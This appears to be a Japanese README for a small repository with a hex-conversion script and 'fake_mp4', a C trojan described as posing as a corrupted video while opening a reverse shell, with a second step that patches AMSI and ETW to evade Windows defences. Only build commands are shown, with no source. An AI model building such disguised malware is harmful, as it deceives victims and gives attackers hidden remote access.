# hex_dealer.py
16進数の変換と計算を行う簡易的なプログラム。

# fake_mp4
動画ファイルを装い、バックグラウンドではリバースシェル接続を行うC製のプログラム。
## Step1
実行時に動画ファイルが破損しているメッセージを表示し、バックグラウンドでリバースシェル接続を行う。
```powershell
gcc -o step1 fake_mp4\step1.c -lws2_32 -mwindows
```
## Step2
AMSIとETWをパッチする機能を追加する。
```powershell
gcc -o step2 fake_mp4\step2.c -lws2_32 -mwindows
```